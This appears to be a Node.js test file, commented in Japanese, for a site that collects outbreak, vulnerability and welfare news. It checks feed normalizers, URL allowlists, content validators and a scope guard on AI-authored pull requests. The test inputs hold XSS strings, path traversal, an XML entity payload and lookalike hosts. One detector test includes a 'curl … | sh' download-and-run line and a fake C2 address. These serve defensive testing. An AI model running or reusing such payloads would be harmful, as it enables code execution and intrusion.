// 変換・検査処理の自己テスト（ネット接続なし）。悪意ある入力を落とせるかも確認する。
// 使い方: node scripts/test.mjs

import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { checkCleanPng } from './check-privacy.mjs';
import { judge } from './scope-guard.mjs';
import { normalizeDon } from './fetch-who-don.mjs';
import { normalizeKev, parseJpcertRdf } from './fetch-security.mjs';
import { validateItems, validateChangelog, validateDirectoryDoc } from './validate-data.mjs';
import { applySupersede } from './lib/supersede.mjs';
import { checkNode } from './lib/node-guard.mjs';
import { parseSiteUrl } from './lib/seo.mjs';
import { isAllowedUrl, cleanText, readJson, findAttackDetail } from './lib/safety.mjs';

const NOW = Date.parse('2026-10-25T00:00:00Z');
let n = 0;
const test = (name, fn) => {
  fn();
  n++;
  console.log('ok -', name);
};

test('WHO: 病名と国を分解し、日本語病名と国コードを付ける', () => {
  const it = normalizeDon({ Title: 'Cholera – Democratic Republic of the Congo', PublicationDate: '2026-10-20T10:00:00Z', UrlName: '2026-DON700' }, NOW);
  assert.equal(it.countries[0], 'COD');
  assert.equal(it.placeBasis, 'reported_country');
  assert.equal(it.importance, 'major');
  assert.match(it.title.ja, /^コレラ/);
  assert.equal(it.source.url, 'https://www.who.int/emergencies/disease-outbreak-news/item/2026-DON700');
});

test('WHO: 複数国の列挙と「Global」', () => {
  const a = normalizeDon({ Title: 'Mpox - Kenya, Uganda and United Republic of Tanzania', PublicationDate: '2026-09-01', UrlName: '2026-DON701' }, NOW);
  assert.deepEqual(a.countries, ['KEN', 'UGA', 'TZA']);
  assert.equal(a.importance, 'minor');
  const g = normalizeDon({ Title: 'Yellow fever – Global situation', PublicationDate: '2026-09-01', UrlName: '2026-DON702' }, NOW);
  assert.equal(g.placeBasis, 'global');
  assert.equal(g.countries.length, 0);
});

test('WHO: 一部でも国名不明なら地球儀に置かない', () => {
  const it = normalizeDon({ Title: 'Dengue – Atlantis and Peru', PublicationDate: '2026-10-01', UrlName: '2026-DON703' }, NOW);
  assert.equal(it.placeBasis, 'unknown');
  assert.equal(it.countries.length, 0);
});

test('WHO: 不正なURL断片・HTML・不可視文字・未来日・古すぎる日付を落とす/無害化する', () => {
  assert.equal(normalizeDon({ Title: 'X', PublicationDate: '2026-10-01', UrlName: '../../evil' }, NOW), null);
  assert.equal(normalizeDon({ Title: 'X', PublicationDate: '2031-01-01', UrlName: 'a-b-c' }, NOW), null);
  assert.equal(normalizeDon({ Title: 'X', PublicationDate: '2025-01-01', UrlName: 'a-b-c' }, NOW), null);
  const it = normalizeDon({ Title: 'Cholera‮ <img src=x onerror=alert(1)> – Peru', PublicationDate: '2026-10-01', UrlName: 'abc-1' }, NOW);
  assert.ok(!/[<>‮]/.test(it.title.original));
});

test('KEV: 30日以内のみ、ランサムウェアKnownは major、場所は発表機関の所在国', () => {
  const v = { cveID: 'CVE-2026-12345', vendorProject: 'Acme', product: 'Gate', vulnerabilityName: 'Acme Gate RCE', dateAdded: '2026-10-20', knownRansomwareCampaignUse: 'Known', requiredAction: 'Apply mitigations per vendor instructions.' };
  const it = normalizeKev(v, NOW);
  assert.equal(it.importance, 'major');
  assert.equal(it.placeBasis, 'publisher_country');
  assert.deepEqual(it.countries, ['USA']);
  assert.equal(normalizeKev({ ...v, dateAdded: '2026-08-01' }, NOW), null);
  assert.equal(normalizeKev({ ...v, cveID: 'CVE-2026-1"><script>' }, NOW), null);
  assert.equal(normalizeKev({ ...v, requiredAction: '' }, NOW), null); // 対処方法が示されていないものは載せない
});

test('JPCERT: 注意喚起のみ抽出、DOCTYPE/ENTITY入りは拒否', () => {
  const xml = `<rdf:RDF><item rdf:about="x"><title>テスト注意喚起</title><link>https://www.jpcert.or.jp/at/2026/at260099.html</link><dc:date>2026-10-20T10:00+09:00</dc:date></item>
  <item><title>週報</title><link>https://www.jpcert.or.jp/wr/2026/wr264001.html</link><dc:date>2026-10-20T10:00+09:00</dc:date></item>
  <item><title>偽</title><link>https://evil.example/at/x</link><dc:date>2026-10-20T10:00+09:00</dc:date></item></rdf:RDF>`;
  const items = parseJpcertRdf(xml, NOW);
  assert.equal(items.length, 1);
  assert.equal(items[0].countries[0], 'JPN');
  assert.throws(() => parseJpcertRdf('<!DOCTYPE x [<!ENTITY a "b">]><rdf:RDF/>', NOW));
});

test('URL許可リスト: http・javascript・偽装ホスト・認証情報入りを拒否', () => {
  assert.ok(isAllowedUrl('https://www.who.int/x'));
  assert.ok(!isAllowedUrl('http://www.who.int/x'));
  assert.ok(!isAllowedUrl('javascript:alert(1)'));
  assert.ok(!isAllowedUrl('https://who.int.evil.example/x'));
  assert.ok(!isAllowedUrl('https://evilwho.int/x'));
  assert.ok(!isAllowedUrl('https://user:pass@www.who.int/')); // 認証情報入りURLを拒否するテスト用の架空の値（check-privacy.mjs の ALLOW に登録済み）
  assert.ok(!isAllowedUrl('https://www.who.int:8443/'));
});

test('手動データ: 断定表現・HTML・出典主語なしの福祉・確認日なしを拒否', () => {
  const base = { id: 'welfare-1', layer: 'welfare', title: { ja: 'A国の制度' }, summary: { ja: 'この制度で貧困は必ず効く' }, countries: ['SWE'], placeBasis: 'reported_country', importance: 'minor', publishedAt: '2026-01-01', checkedAt: '2026-10-01', source: { name: 'OECD', url: 'https://www.oecd.org/' }, sourceType: 'intl_org' };
  const errs = validateItems([base], { layer: 'welfare', curated: true });
  assert.ok(errs.some((e) => e.includes('必ず')));
  assert.ok(errs.some((e) => e.includes('attribution')));
  const errs2 = validateItems([{ ...base, summary: { ja: '<b>x</b>' }, attribution: { ja: 'OECDによれば' }, checkedAt: undefined }], { layer: 'welfare', curated: true });
  assert.ok(errs2.some((e) => e.includes('HTML')));
  assert.ok(errs2.some((e) => e.includes('checkedAt')));
});

const good = { id: 'research-1', layer: 'research', title: { ja: '研究の見出し', en: 'Study headline' }, summary: { ja: '対象者で変化が報告された', en: 'A change was reported in participants' }, countries: ['JPN'], placeBasis: 'reported_country', importance: 'minor', publishedAt: '2026-01-01', checkedAt: '2026-10-01', source: { name: 'Nature', url: 'https://www.nature.com/articles/x' }, sourceType: 'peer_reviewed' };
const errsOf = (patch) => validateItems([{ ...good, ...patch }], { layer: 'research', curated: true });
const sum = (ja) => ({ summary: { ja, en: 'A change was reported in participants' } });
const phraseErr = (errs) => errs.some((e) => e.includes('断定・誇大'));

test('手動データ: 正しい項目は通る', () => {
  assert.deepEqual(errsOf({}), []);
});

test('手動データ: ゼロ幅文字・全角・別項目での断定表現のすり抜けを拒否', () => {
  assert.ok(phraseErr(errsOf(sum('これで治\u200Bる'))));
  assert.ok(phraseErr(errsOf(sum('効果は１００％'))));
  assert.ok(phraseErr(errsOf(sum('根治が期待'))));
  for (const bad of ['これで治ります', '症状が治った', 'よく効きます', '効果がある', '副作用はない', '百パーセント', 'It cures 100 percent'])
    assert.ok(phraseErr(errsOf(sum(bad))), bad);
  assert.deepEqual(errsOf(sum('つらいときは必ず相談窓口へ。確実な情報は原典で。')), []);
  assert.ok(errsOf({ tags: ['必ず効く'] }).some((e) => e.includes('tags')));
  assert.ok(phraseErr(errsOf({ links: [{ label: '特効薬の情報', url: 'https://www.nature.com/x' }] })));
});

test('手動データ: 双方向制御文字・未定義の項目名・不正な形を拒否', () => {
  assert.ok(errsOf({ title: { ja: 'abc\u202Eevil' } }).some((e) => e.includes('見えない文字')));
  assert.ok(errsOf({ onclick: 'x' }).some((e) => e.includes('定義されていない')));
  assert.ok(errsOf({ summary: { ja: 'a', fr: 'b' } }).some((e) => e.includes('使えないキー')));
  assert.ok(errsOf({ links: { label: 'a', url: 'https://www.nature.com/' } }).some((e) => e.includes('links は配列')));
  assert.ok(errsOf({ links: 'https://www.nature.com/' }).length > 0);
  assert.ok(errsOf({ placeBasis: 'global' }).some((e) => e.includes('countries を空')));
  assert.ok(errsOf({ id: 'welfare-9' }).some((e) => e.includes('research-')));
  assert.ok(errsOf({ publishedAt: '2026-02-30' }).some((e) => e.includes('publishedAt')));
});

test('URL許可リスト: ホスト完全一致とパス規則', () => {
  assert.ok(isAllowedUrl('https://doi.org/10.1038/s41586-026-00001-1'));
  assert.ok(!isAllowedUrl('https://doi.org/not-a-doi'));
  assert.ok(isAllowedUrl('https://pubmed.ncbi.nlm.nih.gov/12345678/'));
  assert.ok(!isAllowedUrl('https://evil.nih.gov/x'));
  assert.ok(!isAllowedUrl('https://blog.nature.com/x'));
  assert.ok(!isAllowedUrl('https://nvd.nist.gov/other'));
  assert.ok(isAllowedUrl('https://nvd.nist.gov/vuln/detail/CVE-2026-12345'));
});

test('JPCERT: パスを正規化してから注意喚起か判定する', () => {
  const xml = `<rdf:RDF><item><title>x</title><link>https://www.jpcert.or.jp/at/../wr/at/</link><dc:date>2026-10-20T10:00+09:00</dc:date></item></rdf:RDF>`;
  assert.equal(parseJpcertRdf(xml, NOW).length, 0);
});

test('手動データ: 英語の見出し・要約が無ければ拒否', () => {
  assert.ok(errsOf({ title: { ja: '見出しのみ' } }).some((e) => e.includes('title.en')));
  assert.ok(errsOf({ summary: { ja: '日本語のみ' } }).some((e) => e.includes('summary.en')));
});

test('英語の断定表現も拒否', () => {
  assert.ok(errsOf({ summary: { ja: '変化が報告された', en: 'A miracle cure with no side effects' } }).length > 0);
});

test('更新履歴: 記録の無い項目・個人名らしき作業者名を拒否', () => {
  const ok = { schemaVersion: 1, entries: [{ date: '2026-10-01', by: 'ai-curator', summary: { ja: '追加', en: 'Added' }, ids: ['research-1'] }] };
  assert.deepEqual(validateChangelog(ok, ['research-1'], 'log'), []);
  assert.ok(validateChangelog(ok, ['research-2'], 'log').some((e) => e.includes('research-2')));
  const bad = { schemaVersion: 1, entries: [{ date: '2026-10-01', by: 'Taro Yamada', summary: { ja: 'a', en: 'a' }, ids: [] }] };
  assert.ok(validateChangelog(bad, [], 'log').some((e) => e.includes('by')));
});

test('以前の情報: 同じ地域・話題の古い情報は7日間だけ「以前の情報」として残す', () => {
  const mk = (id, d) => ({ id, layer: 'outbreak', topic: 'cholera', countries: ['COD'], publishedAt: d, importance: 'major' });
  const out = applySupersede([mk('a', '2026-10-24'), mk('b', '2026-10-20'), mk('c', '2026-10-10')], NOW);
  assert.deepEqual(out.map((x) => [x.id, !!x.superseded]), [['a', false], ['b', true]]);
  assert.equal(out[1].importance, 'minor');
  assert.equal(out[1].supersededBy, 'a');
});

test('監査指摘への対策：すり抜け・偽装・未来日・許可外DOIを拒否', () => {
  assert.ok(phraseErr(errsOf(sum('治\u2800る'))));
  assert.ok(errsOf({ summary: { ja: '変化が報告された', en: 'A \u0441ure was reported' } }).some((e) => e.includes('混在')));
  for (const bad of ['治癒した', 'なおる', '必ずよくなる', '効果的な治療'])
    assert.ok(phraseErr(errsOf(sum(bad))), bad);
  for (const bad of ['curing the disease', 'a miraculous result', 'without side effects', 'one hundred percent', 'proven to work'])
    assert.ok(phraseErr(errsOf({ summary: { ja: '変化が報告された', en: bad } })), bad);
  assert.deepEqual(errsOf({ summary: { ja: '変化が報告された', en: 'Secure procurement of vaccines was reported' } }), []);
  assert.ok(errsOf({ publishedAt: '2099-01-01' }).some((e) => e.includes('publishedAt')));
  assert.ok(errsOf({ source: { name: 'Nature', url: 'https://www.nature.com/articles/x?utm=1' } }).some((e) => e.includes('source.url')));
  assert.ok(!isAllowedUrl('https://doi.org/10.5281/zenodo.123'));
  assert.ok(isAllowedUrl('https://doi.org/10.1056/NEJMoa2026001'));
  const log = { schemaVersion: 1, entries: [{ date: '2026-10-01', by: 'ai-yamada', summary: { ja: 'a', en: 'a' }, ids: [] }] };
  assert.ok(validateChangelog(log, [], 'log').some((e) => e.includes('by')));
});

test('日本語と英語の画面文言のキーが一致している', () => {
  const ja = readJson('site/i18n/ja.json');
  const en = readJson('site/i18n/en.json');
  assert.deepEqual(Object.keys(ja).sort(), Object.keys(en).sort());
  for (const [k, v] of Object.entries(en)) assert.ok(v.trim(), `en.${k} が空`);
});

test('相談先リンク集：許可外のURL・ひらがな欄の漢字・分類なし・偽装文字を拒否する', () => {
  const base = readJson('data/directory/links.json');
  assert.deepEqual(validateDirectoryDoc(base), []);
  const mutate = (fn) => {
    const d = structuredClone(base);
    fn(d);
    return validateDirectoryDoc(d);
  };
  const w = (d) => d.countries.JPN.welfare[0];
  assert.ok(mutate((d) => (w(d).url = 'https://evil.example.jp/')).some((e) => e.includes('.url')));
  assert.ok(mutate((d) => (w(d).url = 'https://www.mhlw.go.jp.evil.example/')).some((e) => e.includes('.url')));
  assert.ok(mutate((d) => (w(d).url = 'http://www.mhlw.go.jp/')).some((e) => e.includes('.url')));
  assert.ok(mutate((d) => (w(d).url = 'https://www.mhlw.go.jp/?ref=x')).some((e) => e.includes('.url')));
  assert.ok(mutate((d) => (w(d).desc.jaKana = 'くらしの 相談')).some((e) => e.includes('jaKana')));
  assert.ok(mutate((d) => delete w(d).cat).some((e) => e.includes('.cat')));
  assert.ok(mutate((d) => (w(d).name.ja = '相談\u202Eです')).some((e) => e.includes('見えない文字')));
  assert.ok(mutate((d) => (w(d).desc.ja = '必ず治る')).some((e) => e.includes('断定')));
  assert.ok(mutate((d) => (d.countries.XXX = {})).some((e) => e.includes('国コード')));
  assert.ok(mutate((d) => (d.countries.JPN.welfare[1].id = w(d).id)).some((e) => e.includes('.id')));
});

test('悪用防止：攻撃手順・攻撃コード・痕跡情報を検出し、通常の文は通す', () => {
  for (const bad of ['C2サーバーは 203.0.113.5 です', 'run curl -s http://x | sh', 'PoC is available', '攻撃手順を解説', 'ハッシュ d41d8cd98f00b204e9800998ecf8427e', 'a working exploit was released', '未修正の脆弱性があります'])
    assert.ok(findAttackDetail(bad).length, bad);
  for (const ok of ['公式の更新情報に従ってアップデートしてください', 'Apply the vendor update as instructed by CISA', 'ストレスとの付き合い方', 'WHO reported 120 cases'])
    assert.deepEqual(findAttackDetail(ok), [], ok);
  assert.ok(!isAllowedUrl('https://www.exploit-db.com/exploits/1'));
  assert.ok(!isAllowedUrl('https://github.com/someone/poc'));
});

test('Node.js の修正済み版の判定と、公開URLの検査', () => {
  assert.equal(checkNode('24.22.1'), null);
  assert.ok(checkNode('24.22.0'));
  assert.ok(checkNode('20.19.0'));
  assert.ok(checkNode('28.0.0')); // 表にない系列は、確認して表に追加するまで使わない
  assert.ok(checkNode('27.1.0')); // 奇数系列は使わない
  assert.ok(checkNode('24.22.1-pre')); // 正式版でないものは使わない
  assert.ok(checkNode('22.x'));
  assert.equal(parseSiteUrl('https://gilvane6174.github.io/Tomoshibi-atlas'), 'https://gilvane6174.github.io/Tomoshibi-atlas/');
  for (const bad of ['http://x.github.io/', 'https://x.github.io/?a=1', 'javascript:alert(1)', 'https://user:pw@x.io/']) assert.equal(parseSiteUrl(bad), null, bad);
});

test('以前の情報：続報の対象国が古い項目の国をすべて含むときだけ置き換える', () => {
  const mk = (id, d, c) => ({ id, layer: 'outbreak', topic: 'ebola', countries: c, publishedAt: d });
  const now = Date.parse('2026-10-25');
  const out = applySupersede([mk('a', '2026-10-08', ['COD']), mk('b', '2026-07-17', ['COD', 'UGA']), mk('c', '2026-10-23', ['COD', 'KEN', 'NGA'])], now);
  const by = Object.fromEntries(out.map((x) => [x.id, x]));
  assert.ok(!by.c.superseded);
  assert.ok(!by.a, '古い単独の発表は7日を過ぎたので掲載しない');
  assert.ok(by.b && !by.b.superseded, 'UGA は続報に含まれないので残す');
});

test('不可視文字の除去', () => {
  assert.equal(cleanText('a​b\u0000c', 10), 'a b c');
});

test('地図データ：外周は時計回り・穴は反時計回り（逆向きだと地球全体を覆い、現在地の判定が狂う）', () => {
  const geo = readJson('site/data/geo/countries-110m.json');
  const sa = (r) => r.slice(0, -1).reduce((a, p, i) => a + p[0] * r[i + 1][1] - r[i + 1][0] * p[1], 0);
  for (const f of geo.features)
    for (const poly of f.geometry.type === 'Polygon' ? [f.geometry.coordinates] : f.geometry.coordinates) {
      assert.ok(sa(poly[0]) < 0, `${f.id} の外周の向き`);
      for (const h of poly.slice(1)) assert.ok(sa(h) > 0, `${f.id} の穴の向き`);
    }
  const ids = new Set(readJson('site/data/geo/country-index.json').map((c) => c.id));
  for (const f of geo.features) assert.ok(ids.has(f.id), `${f.id} が索引にある`);
});

test('共有画像：付帯情報なし・構造が正しいPNGだけを通す', () => {
  const png = readFileSync(new URL('../site/og-image.png', import.meta.url));
  assert.equal(checkCleanPng(png), null);
  assert.ok(checkCleanPng(Buffer.concat([png, Buffer.from('extra')])));
  assert.ok(checkCleanPng(png.subarray(0, png.length - 12)));
});

test('変更範囲の検査（scope-guard）：AI・外部の PR は data/curated の2ファイルの変更だけ', () => {
  const base = { owner: 'op', repo: 'op/site', headRepo: 'ai/site', headRef: 'curated/x', author: 'ai-bot' };
  const m = (filename, status = 'modified') => ({ filename, status });
  assert.deepEqual(judge({ ...base, files: [m('data/curated/entries.json'), m('data/curated/changelog.json')] }), []);
  assert.ok(judge({ ...base, files: [m('data/curated/entries.json'), m('.github/workflows/validate.yml')] }).length);
  assert.ok(judge({ ...base, files: [m('scripts/check-pr-scope.mjs')] }).length);
  assert.ok(judge({ ...base, files: [m('data/curated/new.json', 'added')] }).length);
  assert.ok(judge({ ...base, files: [m('data/curated/entries.json', 'removed')] }).length);
  assert.ok(judge({ ...base, files: [{ filename: 'data/curated/entries.json', status: 'renamed', previous_filename: 'x' }] }).length);
  // 運用者になりすました curated/ ブランチ・別リポジトリからの PR は運用者扱いしない
  assert.ok(judge({ ...base, author: 'op', files: [m('scripts/a.mjs')] }).length);
  assert.ok(judge({ ...base, author: 'op', headRef: 'fix', files: [m('scripts/a.mjs')] }).length);
  assert.deepEqual(judge({ ...base, author: 'op', headRepo: 'op/site', headRef: 'fix', files: [m('scripts/a.mjs')] }), []);
  assert.deepEqual(judge({ ...base, author: 'dependabot[bot]', files: [m('.github/workflows/deploy.yml')] }), []);
  assert.ok(judge({ ...base, author: 'dependabot[bot]', files: [m('scripts/a.mjs')] }).length);
  assert.ok(judge({ ...base, owner: '', files: [m('data/curated/entries.json')] }).length);
});

console.log(`\n${n} tests passed`);
